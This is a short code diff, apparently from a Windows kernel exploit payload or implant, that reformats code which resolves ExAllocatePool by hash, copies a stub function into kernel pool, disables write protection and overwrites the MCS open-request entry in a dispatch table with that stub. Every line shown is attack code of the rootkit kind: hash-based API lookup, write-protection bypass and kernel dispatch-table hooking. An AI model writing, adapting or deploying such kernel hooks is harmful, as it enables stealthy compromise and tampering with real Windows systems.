@@ -101,18 +101,21 @@ INT WindowsEntrypoint()
     };
 
     NTSTATUS McsDispatchHook()
-    { return STATUS_SUCCESS; };
+    { 
+	    return STATUS_SUCCESS; 
+    };
     VOID McsDispatchHook_End() { };
 
 FoundTableEntrypoint:
 
     Func.ExAllocatePool = GetPeFunc(Drvs.NtosKrnlBase, HASH_EXALLOCATEPOOL);
+    
     SIZE_T LengthOfFunction = PTR(&McsDispatchHook_End) - PTR(&McsDispatchHook);
     LPVOID FunctionPoolPtr  = Func.ExAllocatePool(0, LengthOfFunction);
-
     Memcpy_Inline(FunctionPoolPtr, &McsDispatchHook, LengthOfFunction);
-    DisableWriteProtection();
-    ReqTbl[INDEX_MCS_OPEN_REQUEST] = (LPVOID)FunctionPoolPtr;
+
+    DisableWriteProtection(); 
+    ReqTbl[INDEX_MCS_OPEN_REQUEST] = (LPVOID)FunctionPoolPtr; 
     EnableWriteProtection();
   };
 
